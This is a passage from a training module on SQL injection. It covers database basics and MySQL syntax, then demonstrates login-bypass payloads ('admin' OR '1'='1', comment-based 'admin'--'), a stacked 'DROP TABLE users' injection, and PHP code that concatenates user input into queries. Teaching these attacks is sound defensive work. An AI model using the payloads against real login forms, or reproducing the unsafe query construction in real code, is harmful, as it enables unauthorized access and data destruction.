# Module 8: SQL Injection Fundamentals

## Introduction

### Introduction

Most modern web applications sit on top of a **database-backed architecture**. User requests reach the application, the application builds database queries, and the database returns data used to generate the response.

In practice, this looks like a three-tier flow:

* User interacts with the client
* Client sends HTTP(S) requests to an application server
* Application server issues queries to a database (DBMS)

When **user-supplied input is included in those queries**, the database becomes an attack surface.

***

#### Example: Where SQL Injection Enters the Flow

A typical request cycle:

1. User submits data through a form or URL parameter
2. Application uses that data to build an SQL query
3. Query is sent to the database
4. Database response is returned to the user

If the application does not strictly control how input is handled, an attacker can supply input that **changes the structure of the SQL query itself**, not just its values. This is the core of **SQL Injection (SQLi)**.

***

#### SQL Injection (SQLi)

SQL injection is an attack against **relational databases** (such as MySQL) where attacker-controlled input alters the final SQL query executed by the database.

This module focuses on **MySQL-based SQL injection**. Injection techniques against non-relational databases (for example, MongoDB) fall under **NoSQL injection** and are out of scope here.

***

#### Example: Escaping Intended Input Boundaries

Most SQL injection attacks begin by **breaking out of expected input boundaries**.

In the simplest case, this is done by injecting:

* A single quote `'`
* A double quote `"`

These characters are commonly used to delimit string values in SQL. If input is not handled safely, injecting one of them can terminate the intended value and allow new SQL syntax to be appended.

Once injection is possible, the attacker focuses on:

* Modifying the original query’s logic
* Or appending additional SQL statements

This can be done using techniques such as:

* UNION queries
* Stacked queries
* Conditional logic

The attacker then observes how the application responds to infer or extract data.

***

#### Use Cases and Impact

SQL injection has wide impact when database permissions are lax or application logic is fragile.

Common outcomes include:

* **Data disclosure**\
  Usernames, passwords, personal data, and financial information can be retrieved directly from the database.
* **Authentication bypass**\
  Login checks can be subverted, granting access without valid credentials.
* **Privilege escalation**\
  Restricted functionality, such as administrative panels, may become accessible.
* **Server-side compromise**\
  In some configurations, attackers may read or write files on the backend system, leading to persistent access and full application takeover.

These outcomes explain why SQL injection remains one of the most damaging web vulnerabilities.

***

#### Prevention (Context for Later Sections)

SQL injection vulnerabilities arise from:

* Unsafe query construction
* Missing input validation
* Excessive database privileges

Later sections focus on **secure coding practices**, including:

* Input validation and sanitization
* Proper query construction
* Restrictive database permissions

These defenses are discussed after exploitation techniques so the attack paths are fully understood first.

***

## Databases

### Intro to Databases

Before SQL injection makes sense operationally, you need a working mental model of **what databases are**, **how applications talk to them**, and **where attacker-controlled input enters that flow**.

This section establishes that baseline so later SQLi examples are reconstructible rather than abstract.

***

#### Databases in Web Applications

Web applications rely on **back-end databases** to persist almost everything they operate on, including:

* Application assets (images, files, metadata)
* Content (posts, comments, updates)
* User data (usernames, passwords, session-related data)

Each incoming request that needs data triggers **database interaction**. The application builds a query, sends it to the database, and uses the response to construct what the user sees.

This query construction step is where injection becomes possible.

***

#### Database Management Systems (DBMS)

As applications grew beyond small, file-based storage, **Database Management Systems (DBMS)** replaced direct file handling.

A DBMS is responsible for:

* Creating and defining databases
* Storing and retrieving data efficiently
* Enforcing rules around access and consistency

Over time, different DBMS types emerged for different workloads:

* File-based databases
* Relational DBMS (RDBMS)
* NoSQL databases
* Graph databases
* Key/value stores

In this module, the focus is on **relational DBMS**, since that is where classic SQL injection applies.

***

#### Example: How Applications Interact with a DBMS

Applications do not interact with databases directly in one fixed way. Common interaction methods include:

* Command-line database clients
* Graphical database management tools
* Application-level APIs and drivers

In real deployments, applications use **database drivers or libraries** that translate application logic into database queries.

This abstraction is important:\
the application developer writes code, not raw database commands, yet unsafe input handling can still alter the final query.

***

#### DBMS Core Capabilities (Why They’re Used)

A DBMS exists to solve problems that appear immediately at scale:

* **Concurrency**\
  Multiple users can read and write data at the same time without corruption.
* **Consistency**\
  The database enforces rules so data remains valid even under heavy access.
* **Security**\
  Authentication and permission systems restrict who can view or modify data.
* **Reliability**\
  Databases can be backed up and restored after failure or compromise.
* **Structured Query Language**\
  SQL provides a standardized way to insert, retrieve, update, and delete data.

SQL injection targets the last point: how SQL is constructed and executed.

***

#### Architecture: Where the Database Sits

In most modern applications, databases are part of a **multi-tier architecture**.

A common layout:

* **Tier I – Client**\
  Web browser or client application handling user interaction.
* **Tier II – Application Server**\
  Middleware that processes requests, applies logic, and builds database queries.
* **Tier III – DBMS**\
  Database engine that executes queries and returns results.

The application server:

* Receives user input
* Translates it into database operations
* Sends those operations to the DBMS
* Returns results to the client

This separation is critical:\
**user input almost never reaches the database directly**, but SQL injection happens when the application server mishandles how that input is incorporated into queries.

***

#### Example: Deployment Variations

In small deployments:

* Application server and DBMS may run on the same host

In larger environments:

* The DBMS is hosted separately
* Performance, scalability, and isolation improve
* The attack surface expands due to networked components

Regardless of deployment style, SQL injection is possible anywhere **user input influences query construction**.

***

This architectural understanding is the foundation for recognizing where SQL injection occurs, why it works, and how later examples exploit it.

***

### Types of Databases

Databases are broadly categorized into **Relational** and **Non-Relational** systems.\
This distinction determines how data is stored, queried, and whether **SQL injection** is even applicable.

***

#### Relational Databases

Relational databases store data in **tables** with a fixed structure. Each table represents a specific entity, and tables are linked together using **keys**.

**users**

| id | username | first\_name | last\_name |
| -- | -------- | ----------- | ---------- |
| 1  | alice    | Alice       | Smith      |
| 2  | bob      | Bob         | Johnson    |
| 3  | carol    | Carol       | Lee        |

**posts**

| id | user\_id | date       | content                         |
| -- | -------- | ---------- | ------------------------------- |
| 10 | 1        | 2021-01-01 | Welcome to this web application |
| 11 | 2        | 2021-01-02 | This is the first post          |
| 12 | 1        | 2021-01-03 | Reminder: maintenance tonight   |

In this structure:

* `users.id` uniquely identifies each user
* `posts.user_id` references the author of each post
* One user can be associated with multiple posts
* User data is stored once and referenced elsewhere

The collection of tables and their relationships is called the **schema**.\
Queries commonly join tables using these relationships, which is where SQL injection becomes possible if input is handled unsafely.

Relational databases are optimized for:

* Large, structured datasets
* Predictable relationships
* Efficient querying using SQL

Common relational database platforms include MySQL, PostgreSQL, SQL Server, Oracle, and Microsoft Access. This module focuses on **MySQL**, though the concepts apply broadly.

***

#### Non-Relational Databases

Non-relational databases do not use tables, rows, columns, or fixed schemas.\
Each record is typically stored as a self-contained object.

```json
{
  "100001": {
    "date": "2021-01-01",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "2021-01-02",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "2021-01-03",
    "content": "Reminder: maintenance tonight"
  }
}
```

In this model:

* Keys identify records
* Values may be strings, objects, or nested structures
* Relationships are handled by application logic, not enforced by the database
* Structure can vary between records

This storage pattern resembles dictionary or map structures found in languages like Python or PHP.

A common non-relational database implementation is **MongoDB**.

***

#### Injection Implications

* Relational databases\
  → vulnerable to **SQL injection** when queries are constructed unsafely
* Non-relational databases\
  → vulnerable to **NoSQL injection**, which uses different techniques and payloads

SQL injection and NoSQL injection are distinct attack classes and are treated separately.

***

This distinction is critical for recognizing when SQL injection is relevant and why subsequent sections focus exclusively on relational databases.

***

## MySQL

### Intro to MySQL

MySQL is a relational database system. Web applications send SQL statements to MySQL to store and retrieve structured data.

***

#### Connecting to MySQL

```bash
mysql -u root -p
```

* `mysql` – command-line client for MySQL/MariaDB
* `-u root` – database username (`root` is a superuser)
* `-p` – prompt for password instead of passing it inline

```
Enter password:
mysql>
```

* `mysql>` – interactive SQL prompt
* Commands typed here are sent directly to the database

Remote connection:

```bash
mysql -u root -h example.db.host -P 3306 -p
```

* `-h` – database host
* `-P 3306` – TCP port (default MySQL port)

***

#### Databases

A single MySQL server can host multiple databases.

```sql
SHOW DATABASES;
```

* Lists all databases accessible to the current user

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

Create a new database:

```sql
CREATE DATABASE users;
```

Select it:

```sql
USE users;
```

* All table operations now apply to `users`

***

#### Tables

Tables define **how data is stored** inside a database.

```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
);
```

* `logins` – table name
* `id INT` – numeric identifier
* `VARCHAR(100)` – string up to 100 characters
* `DATETIME` – date and time value

List tables:

```sql
SHOW TABLES;
```

```
+-----------------+
| Tables_in_users |
+-----------------+
| logins          |
+-----------------+
```

Inspect table structure:

```sql
DESCRIBE logins;
```

```
+-----------------+--------------+
| Field           | Type         |
+-----------------+--------------+
| id              | int          |
| username        | varchar(100) |
| password        | varchar(100) |
| date_of_joining | datetime     |
+-----------------+--------------+
```

* `Field` – column name
* `Type` – expected data type for that column

This output shows **exactly where user input ends up** when inserted.

***

#### Column Constraints

Constraints control what data is allowed into each column.

Auto-incrementing identifier:

```sql
id INT NOT NULL AUTO_INCREMENT
```

* `NOT NULL` – value is required
* `AUTO_INCREMENT` – value increases automatically per row

Unique usernames:

```sql
username VARCHAR(100) UNIQUE NOT NULL
```

* `UNIQUE` – prevents duplicate values

Default timestamp:

```sql
date_of_joining DATETIME DEFAULT NOW()
```

* `DEFAULT NOW()` – assigns current date/time automatically

Primary key:

```sql
PRIMARY KEY (id)
```

* Uniquely identifies each row
* Used internally for indexing and lookups

***

#### Final Table Definition

```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
);
```

This table shape is typical for authentication data:

* One row per user
* Predictable lookup by `id` or `username`
* Common target for SQL injection when input is used unsafely

***

### SQL Statements

#### INSERT Statement

**Example 1: Insert a full row when all columns require values**

```sql
INSERT INTO logins VALUES (1, 'admin', 'example_pass', '2020-07-02');
```

**What is visible**

* A new row is added.
* All columns are populated in column order.
* This only works when every column is provided and order matches the table schema.

**Key decoding**

* `INSERT INTO <table>` selects the target table.
* `VALUES (...)` must align positionally with all columns.

***

**Example 2: Insert selectively into specific columns**

```sql
INSERT INTO logins(username, password)
VALUES ('administrator', 'admin_pass');
```

**What is visible**

* `id` and `date_of_joining` are auto-filled.
* Only specified columns receive values.

**Key decoding**

* `(username, password)` explicitly defines which columns are written.
* Columns with defaults can be skipped.
* Columns marked `NOT NULL` without defaults cannot be skipped.

***

**Example 3: Insert multiple rows in one statement**

```sql
INSERT INTO logins(username, password)
VALUES
    ('john', 'john_pass'),
    ('tom', 'tom_pass');
```

**What is visible**

* Two new rows are inserted in a single query.
* Row count reflects multiple insertions.

**Key decoding**

* Each parenthesized set represents one row.
* Commas separate rows.

***

#### SELECT Statement

**Example 1: View all columns and rows**

```sql
SELECT * FROM logins;
```

**Visible result**

```
+----+---------------+-------------+---------------------+
| id | username      | password    | date_of_joining     |
+----+---------------+-------------+---------------------+
|  1 | admin         | example_pass| 2020-07-02 00:00:00 |
|  2 | administrator | admin_pass  | 2020-07-02 11:30:50 |
|  3 | john          | john_pass   | 2020-07-02 11:47:16 |
|  4 | tom           | tom_pass    | 2020-07-02 11:47:16 |
+----+---------------+-------------+---------------------+
```

**Key decoding**

* `*` is a wildcard meaning all columns.
* `FROM` specifies the source table.

***

**Example 2: View only specific columns**

```sql
SELECT username, password FROM logins;
```

**Visible result**

```
+---------------+-------------+
| username      | password    |
+---------------+-------------+
| admin         | example_pass|
| administrator | admin_pass  |
| john          | john_pass   |
| tom           | tom_pass    |
+---------------+-------------+
```

**What changed**

* Only selected columns appear.
* Row count remains unchanged.

***

#### DROP Statement

**Example: Remove a table completely**

```sql
DROP TABLE logins;
```

**Visible effect**

* Table no longer exists.

```sql
SHOW TABLES;
```

```
Empty set
```

**Key decoding**

* `DROP TABLE` permanently deletes the table structure and data.
* No confirmation or undo.

***

#### ALTER Statement

**Example 1: Add a new column**

```sql
ALTER TABLE logins ADD newColumn INT;
```

**Visible effect**

* Table gains a new column with default `NULL` values.

***

**Example 2: Rename a column**

```sql
ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
```

**What changed**

* Column name updates.
* Data remains intact.

***

**Example 3: Modify column datatype**

```sql
ALTER TABLE logins MODIFY newerColumn DATE;
```

**What changed**

* Column datatype changes.
* Stored values must be compatible.

***

**Example 4: Drop a column**

```sql
ALTER TABLE logins DROP newerColumn;
```

**Visible effect**

* Column and its data are permanently removed.

***

#### UPDATE Statement

**Example: Update specific rows using a condition**

```sql
UPDATE logins
SET password = 'changed_pass'
WHERE id > 1;
```

**Visible result**

```
Rows matched: 3
Changed: 3
```

```sql
SELECT * FROM logins;
```

```
+----+---------------+---------------+---------------------+
| id | username      | password      | date_of_joining     |
+----+---------------+---------------+---------------------+
|  1 | admin         | example_pass  | 2020-07-02 00:00:00 |
|  2 | administrator | changed_pass  | 2020-07-02 11:30:50 |
|  3 | john          | changed_pass  | 2020-07-02 11:47:16 |
|  4 | tom           | changed_pass  | 2020-07-02 11:47:16 |
+----+---------------+---------------+---------------------+
```

**What is visible**

* Only rows matching `id > 1` change.
* Rows not matching the condition remain unchanged.

**Key decoding**

* `SET` defines new values.
* `WHERE` restricts which rows are modified.
* Omitting `WHERE` updates all rows.

***

### Query Results

#### Sorting Results (ORDER BY)

**Example 1: Sort rows by a single column (default ascending)**

```sql
SELECT * FROM logins
ORDER BY password;
```

**Visible result**

```
+----+---------------+-------------+---------------------+
| id | username      | password    | date_of_joining     |
+----+---------------+-------------+---------------------+
|  2 | administrator | admin_pass  | 2020-07-02 11:30:50 |
|  3 | john          | john_pass   | 2020-07-02 11:47:16 |
|  1 | admin         | example_pass| 2020-07-02 00:00:00 |
|  4 | tom           | tom_pass    | 2020-07-02 11:47:16 |
+----+---------------+-------------+---------------------+
```

**What is visible**

* All rows remain.
* Row order changes based on `password`.
* Ascending order is implied when no direction is specified.

**Inline decoding**

* `ORDER BY <column>` sorts result rows after selection.
* Default sort direction is `ASC`.

***

**Example 2: Sort in descending order**

```sql
SELECT * FROM logins
ORDER BY password DESC;
```

**Visible result**

```
+----+---------------+-------------+---------------------+
| id | username      | password    | date_of_joining     |
+----+---------------+-------------+---------------------+
|  4 | tom           | tom_pass    | 2020-07-02 11:47:16 |
|  1 | admin         | example_pass| 2020-07-02 00:00:00 |
|  3 | john          | john_pass   | 2020-07-02 11:47:16 |
|  2 | administrator | admin_pass  | 2020-07-02 11:30:50 |
+----+---------------+-------------+---------------------+
```

**Inline decoding**

* `DESC` reverses the sort order.
* `ASC` can be written explicitly but is optional.

***

**Example 3: Sort by multiple columns**

```sql
SELECT * FROM logins
ORDER BY password DESC, id ASC;
```

**Visible result**

```
+----+---------------+------------------+---------------------+
| id | username      | password         | date_of_joining     |
+----+---------------+------------------+---------------------+
|  1 | admin         | example_pass     | 2020-07-02 00:00:00 |
|  2 | administrator | changed_password | 2020-07-02 11:30:50 |
|  3 | john          | changed_password | 2020-07-02 11:47:16 |
|  4 | tom           | changed_password | 2020-07-02 11:50:20 |
+----+---------------+------------------+---------------------+
```

**What is visible**

* Primary sort uses `password DESC`.
* Rows with equal passwords are secondarily sorted by `id ASC`.

***

#### Limiting Results (LIMIT)

**Example 1: Return only the first N rows**

```sql
SELECT * FROM logins
LIMIT 2;
```

**Visible result**

```
+----+---------------+-------------+---------------------+
| id | username      | password    | date_of_joining     |
+----+---------------+-------------+---------------------+
|  1 | admin         | example_pass| 2020-07-02 00:00:00 |
|  2 | administrator | admin_pass  | 2020-07-02 11:30:50 |
+----+---------------+-------------+---------------------+
```

**Inline decoding**

* `LIMIT <count>` caps the number of returned rows.
* Without `ORDER BY`, row order depends on storage or execution plan.

***

**Example 2: Use offset with LIMIT**

```sql
SELECT * FROM logins
LIMIT 1, 2;
```

**Visible result**

```
+----+---------------+-----------+---------------------+
| id | username      | password  | date_of_joining     |
+----+---------------+-----------+---------------------+
|  2 | administrator | admin_pass| 2020-07-02 11:30:50 |
|  3 | john          | john_pass | 2020-07-02 11:47:16 |
+----+---------------+-----------+---------------------+
```

**Inline decoding**

* First number is the offset.
* Offset starts at `0`.
* `LIMIT 1, 2` skips the first row, then returns two rows.

***

#### Filtering Results (WHERE)

**Example 1: Filter numeric values**

```sql
SELECT * FROM logins
WHERE id > 1;
```

**Visible result**

```
+----+---------------+-----------+---------------------+
| id | username      | password  | date_of_joining     |
+----+---------------+-----------+---------------------+
|  2 | administrator | admin_pass| 2020-07-02 11:30:50 |
|  3 | john          | john_pass | 2020-07-02 11:47:16 |
|  4 | tom           | tom_pass  | 2020-07-02 11:47:16 |
+----+---------------+-----------+---------------------+
```

**What is visible**

* Rows not matching the condition are excluded.
* Table structure remains unchanged.

***

**Example 2: Filter string values**

```sql
SELECT * FROM logins
WHERE username = 'admin';
```

**Visible result**

```
+----+----------+-------------+---------------------+
| id | username | password    | date_of_joining     |
+----+----------+-------------+---------------------+
|  1 | admin    | example_pass| 2020-07-02 00:00:00 |
+----+----------+-------------+---------------------+
```

**Inline decoding**

* String and date values require quotes.
* Numeric values do not.

***

#### Pattern Matching (LIKE)

**Example 1: Match values starting with a prefix**

```sql
SELECT * FROM logins
WHERE username LIKE 'admin%';
```

**Visible result**

```
+----+---------------+-------------+---------------------+
| id | username      | password    | date_of_joining     |
+----+---------------+-------------+---------------------+
|  1 | admin         | example_pass| 2020-07-02 00:00:00 |
|  4 | administrator | admin_pass  | 2020-07-02 15:19:02 |
+----+---------------+-------------+---------------------+
```

**Inline decoding**

* `%` matches zero or more characters.
* Pattern matching is applied after row filtering.

***

**Example 2: Match fixed-length strings**

```sql
SELECT * FROM logins
WHERE username LIKE '___';
```

**Visible result**

```
+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  3 | tom      | tom_pass | 2020-07-02 15:18:56 |
+----+----------+----------+---------------------+
```

**Inline decoding**

* `_` matches exactly one character.
* Three underscores require a three-character string.

***

### SQL Operators

#### AND Operator

**Example: both conditions must be true**

```sql
SELECT 1 = 1 AND 'test' = 'test';
```

**Visible result**

```
+---------------------------+
| 1 = 1 AND 'test' = 'test' |
+---------------------------+
|                         1 |
+---------------------------+
```

```sql
SELECT 1 = 1 AND 'test' = 'abc';
```

**Visible result**

```
+--------------------------+
| 1 = 1 AND 'test' = 'abc' |
+--------------------------+
|                        0 |
+--------------------------+
```

**Inline decoding**

* `AND` evaluates both expressions.
* Result is true (`1`) only if both sides are true.
* MySQL treats `1` as true and `0` as false.

***

#### OR Operator

**Example: at least one condition must be true**

```sql
SELECT 1 = 1 OR 'test' = 'abc';
```

**Visible result**

```
+-------------------------+
| 1 = 1 OR 'test' = 'abc' |
+-------------------------+
|                       1 |
+-------------------------+
```

```sql
SELECT 1 = 2 OR 'test' = 'abc';
```

**Visible result**

```
+-------------------------+
| 1 = 2 OR 'test' = 'abc' |
+-------------------------+
|                       0 |
+-------------------------+
```

**Inline decoding**

* `OR` returns true if any expression is true.
* Returns false only when all expressions are false.

***

#### NOT Operator

**Example: invert a boolean expression**

```sql
SELECT NOT 1 = 1;
```

**Visible result**

```
+-----------+
| NOT 1 = 1 |
+-----------+
|         0 |
+-----------+
```

```sql
SELECT NOT 1 = 2;
```

**Visible result**

```
+-----------+
| NOT 1 = 2 |
+-----------+
|         1 |
+-----------+
```

**Inline decoding**

* `NOT` flips the result of the expression.
* True becomes false, false becomes true.

***

#### Symbol Operators

**Example: symbolic equivalents**

```sql
SELECT 1 = 1 && 'test' = 'abc';
```

```
0
```

```sql
SELECT 1 = 1 || 'test' = 'abc';
```

```
1
```

```sql
SELECT 1 != 1;
```

```
0
```

**Inline decoding**

* `&&` is equivalent to `AND`
* `||` is equivalent to `OR`
* `!` and `!=` represent logical negation and not-equal comparison

***

#### Operators in Queries

**Example: exclude a specific value**

```sql
SELECT * FROM logins
WHERE username != 'john';
```

**Visible result**

```
+----+---------------+-----------+---------------------+
| id | username      | password  | date_of_joining     |
+----+---------------+-----------+---------------------+
|  1 | admin         | example   | 2020-07-02 00:00:00 |
|  2 | administrator | admin_pw  | 2020-07-02 11:30:50 |
|  4 | tom           | tom_pw    | 2020-07-02 11:47:16 |
+----+---------------+-----------+---------------------+
```

***

**Example: combine conditions**

```sql
SELECT * FROM logins
WHERE username != 'john'
  AND id > 1;
```

**Visible result**

```
+----+---------------+-----------+---------------------+
| id | username      | password  | date_of_joining     |
+----+---------------+-----------+---------------------+
|  2 | administrator | admin_pw  | 2020-07-02 11:30:50 |
|  4 | tom           | tom_pw    | 2020-07-02 11:47:16 |
+----+---------------+-----------+---------------------+
```

**What changed**

* Rows must satisfy both conditions simultaneously.
* Any row failing one condition is excluded.

***

#### Operator Precedence

**Precedence order (highest to lowest)**

1. `/`, `*`, `%`
2. `+`, `-`
3. `=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`
4. `NOT`, `!`
5. `AND`, `&&`
6. `OR`, `||`

***

**Example: precedence in action**

```sql
SELECT * FROM logins
WHERE username != 'tom'
  AND id > 3 - 2;
```

**Step 1: arithmetic evaluated first**

```sql
id > 3 - 2
```

becomes:

```sql
id > 1
```

**Step 2: comparisons evaluated**

* `username != 'tom'`
* `id > 1`

**Step 3: logical AND applied**

```sql
SELECT * FROM logins
WHERE username != 'tom'
  AND id > 1;
```

**Visible result**

```
+----+---------------+-----------+---------------------+
| id | username      | password  | date_of_joining     |
+----+---------------+-----------+---------------------+
|  2 | administrator | admin_pw  | 2020-07-03 12:03:53 |
|  3 | john          | john_pw   | 2020-07-03 12:03:57 |
+----+---------------+-----------+---------------------+
```

***

#### DESCRIBE Statement (Schema Inspection)

**Example: inspect column names and datatypes**

```sql
DESCRIBE logins;
```

**Visible result**

```
+------------------+--------------+------+-----+-------------------+----------------+
| Field            | Type         | Null | Key | Default           | Extra          |
+------------------+--------------+------+-----+-------------------+----------------+
| id               | int          | NO   | PRI | NULL              | auto_increment |
| username         | varchar(50)  | NO   |     | NULL              |                |
| password         | varchar(100) | NO   |     | NULL              |                |
| date_of_joining  | datetime     | YES  |     | CURRENT_TIMESTAMP |                |
+------------------+--------------+------+-----+-------------------+----------------+
```

**Inline decoding**

* `DESCRIBE <table>` returns metadata, not row data.
* Confirms column names, datatypes, nullability, defaults, and keys.
* Commonly used before writing `INSERT`, `UPDATE`, `WHERE`, or `ALTER` statements to avoid schema assumptions.

***

## SQL Injections

### Intro to SQL Injections

#### Use of SQL in Web Applications

**Example: executing SQL inside a PHP application**

```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```

**What is visible**

* SQL is constructed as a string inside application code.
* The database executes whatever SQL string is provided.

***

**Example: consuming query results**

```php
while ($row = $result->fetch_assoc()) {
    echo $row["username"] . "<br>";
}
```

**What is visible**

* Each returned row is iterated and printed.
* The application fully trusts the query result.

***

**Example: SQL query built using user input**

```php
$searchInput = $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

**What is visible**

* User input is concatenated directly into the SQL string.
* No validation, escaping, or sanitization is applied.

**Inline decoding**

* `$searchInput` becomes part of the SQL syntax, not just data.
* Any characters the user provides are interpreted by the SQL engine.

***

#### What Is an Injection?

**Example: intended behavior**

User input:

```
admin
```

Generated SQL:

```sql
select * from logins where username like '%admin'
```

**What is visible**

* Input is treated as plain text.
* Query logic remains unchanged.

***

**Example: breaking input boundaries**

User input:

```
1'; DROP TABLE users;
```

Generated SQL:

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

**What is visible**

* The single quote (`'`) closes the original string.
* SQL after the quote is interpreted as executable code.
* The final trailing quote causes a syntax error.

**Inline decoding**

* `'` escapes the string context.
* `;` attempts to terminate the first statement.
* Injected SQL alters intended execution flow.

***

#### SQL Injection

**Definition shown through behavior**

Injection occurs when:

* User input is inserted into SQL without sanitization.
* The database interprets user input as SQL code.
* The executed query differs from the developer’s intent.

**Example: unsafe query construction**

```php
$query = "select * from logins where username like '%$searchInput'";
```

**What is visible**

* The SQL engine cannot distinguish user data from SQL syntax.
* Any special characters are processed as part of SQL parsing.

***

#### Syntax Errors During Injection

**Example: malformed injected query**

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

**Result**

```
Error: near "'": syntax error
```

**What is visible**

* An extra unmatched quote breaks SQL parsing.
* Execution stops with a syntax error.

**Inline decoding**

* Successful injection requires syntactically valid SQL.
* Attackers must neutralize or comment out remaining query text.

***

#### Why Injection Is Still Possible Without Source Code

**Observed constraints**

* Attackers usually do not see the original query.
* Input is often embedded mid-query, not at the end.

**Observed solutions**

* Use SQL comments to ignore trailing query parts.
* Balance quotes to preserve valid SQL syntax.

(These mechanisms are demonstrated in later sections.)

***

#### Types of SQL Injections

**Classification by output visibility**

1.  **In-band SQL Injection**

    * Output is returned directly in the response.

    **Types**

    * Union-based
    * Error-based

***

2.  **Blind SQL Injection**

    * No direct output is shown.
    * Data is inferred through application behavior.

    **Types**

    * Boolean-based
    * Time-based

***

3. **Out-of-band SQL Injection**
   * Output is exfiltrated through external channels.
   * Examples include DNS or HTTP callbacks.

***

### Subverting Query Logic

#### Authentication Bypass (Baseline Behavior)

**Example: intended authentication query**

```sql
SELECT * FROM logins
WHERE username='admin' AND password='p@ssw0rd';
```

**What is visible**

* `AND` requires both conditions to be true.
* A matching row means authentication succeeds.
* No matching row means authentication fails.

***

**Example: incorrect credentials**

```sql
SELECT * FROM logins
WHERE username='admin' AND password='admin';
```

**What is visible**

* `username='admin'` is true.
* `password='admin'` is false.
* `TRUE AND FALSE` evaluates to false.
* No rows returned. Login fails.

***

#### SQLi Discovery (Testing for Injection)

**Example: inject a single quote**

User input (username field):

```
'
```

Resulting query:

```sql
SELECT * FROM logins
WHERE username=''' AND password='something';
```

**Visible result**

* SQL syntax error is returned.
* Application behavior changes from “Login failed” to an error.

**Inline decoding**

* An odd number of quotes breaks SQL parsing.
* This confirms user input is inserted directly into the query.
* The parameter is injectable.

***

#### OR Injection (Logic Subversion)

**Objective**

* Make the `WHERE` clause evaluate to true regardless of password.

***

**Key precedence rule (from earlier)**

* `AND` is evaluated before `OR`.

Order:

1. Comparisons
2. `AND`
3. `OR`

***

#### Crafting an Always-True Condition

**Example: constant true condition**

```sql
'1'='1'
```

* Always evaluates to true.

***

**Injected username payload**

```
admin' OR '1'='1
```

**Why this form**

* Removes the closing quote.
* Uses the original trailing quote to balance syntax.

***

#### Resulting Query

```sql
SELECT * FROM logins
WHERE username='admin' OR '1'='1' AND password='something';
```

***

#### Logical Evaluation (Step-by-Step)

**Step 1: AND evaluated first**

```
'1'='1'        → TRUE
password='something' → FALSE

TRUE AND FALSE → FALSE
```

***

**Step 2: OR evaluated**

```
username='admin' → TRUE (admin exists)

TRUE OR FALSE → TRUE
```

***

**Final outcome**

* Query returns at least one row.
* Authentication succeeds.
* Password check is effectively bypassed.

***

#### Auth Bypass in Practice (Known Username)

**Injected username**

```
admin' OR '1'='1
```

**Injected password**

```
anything
```

**Executed query**

```sql
SELECT * FROM logins
WHERE username='admin' OR '1'='1' AND password='anything';
```

**What is visible**

* Login succeeds as `admin`.

***

#### Auth Bypass (Unknown Username)

**Injected username**

```
notAdmin' OR '1'='1
```

**Resulting query**

```sql
SELECT * FROM logins
WHERE username='notAdmin' OR '1'='1' AND password='something';
```

**Evaluation**

* `username='notAdmin'` → FALSE
* `'1'='1' AND password='something'` → FALSE
* `FALSE OR FALSE` → FALSE

**Visible result**

* No rows returned.
* Login fails.

***

#### OR Injection in Password Field

**Injected password**

```
something' OR '1'='1
```

**Resulting query**

```sql
SELECT * FROM logins
WHERE username='notAdmin'
OR '1'='1' AND password='something'
OR '1'='1';
```

***

#### Logical Evaluation

* `'1'='1'` → TRUE
* Multiple `OR` conditions ensure the full `WHERE` clause evaluates to true.
* Entire table is returned.
* Application logs in the first row (commonly `admin`).

***

#### Minimal Payload Auth Bypass

**Injected username**

```
' OR '1'='1
```

**Injected password**

```
' OR '1'='1
```

**Resulting query**

```sql
SELECT * FROM logins
WHERE username='' OR '1'='1'
AND password='' OR '1'='1';
```

**What is visible**

* Conditions always evaluate to true.
* Authentication succeeds without knowing any credentials.

***

#### Key Observations

* `OR` can override authentication logic when combined with operator precedence.
* Balancing quotes is critical to avoid syntax errors.
* No comments are required in this example, only logical subversion.
* Returned row order determines which user is logged in.

***

### Using Comments

#### SQL Comments

**Example: line comment with `--`**

```sql
SELECT username FROM logins; -- Selects usernames from the logins table
```

**Visible result**

```
+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |
+---------------+
```

**Inline decoding**

* Everything after `--` is ignored by the SQL engine.
* A space after `--` is required for the comment to begin.
* In URL contexts, the space is commonly encoded as `+`, resulting in `--+`.

***

**Example: line comment with `#`**

```sql
SELECT * FROM logins
WHERE username = 'admin'; # AND password = 'something'
```

**Visible result**

```
+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
```

**Inline decoding**

* `#` comments out the remainder of the query line.
* In browsers, `#` must be URL encoded as `%23` or it will be treated as a fragment identifier.
* Any SQL logic after the comment marker is ignored during execution.

***

#### Authentication Bypass Using Comments

**Original authentication query**

```sql
SELECT * FROM logins
WHERE username='admin' AND password='something';
```

**Injected username**

```
admin'--
```

**Resulting query**

```sql
SELECT * FROM logins
WHERE username='admin'-- ' AND password='something';
```

**What is visible**

* The username comparison remains intact.
* The password condition is commented out and never evaluated.
* The query is syntactically valid.

**Effect**

* The database returns the admin row.
* Authentication succeeds without validating the password.

***

#### Why Comment Injection Works Here

At the point where user input is injected:

* The closing quote ends the string.
* The comment marker causes the SQL parser to ignore the remainder of the statement.
* No additional logical manipulation is required.

***

#### Parentheses and Enforced Conditions

**More restrictive authentication query**

```sql
SELECT * FROM logins
WHERE (username='admin' AND id > 1)
  AND password='437b930db84b8079c2dd804a71936b5f';
```

**What this enforces**

* Parentheses force `username` and `id` to be evaluated together.
* `id > 1` blocks the admin account (`id = 1`).
* Password is hashed before comparison, preventing password-field injection.

***

**Valid admin credentials still fail**

```sql
SELECT * FROM logins
WHERE (username='admin' AND id > 1)
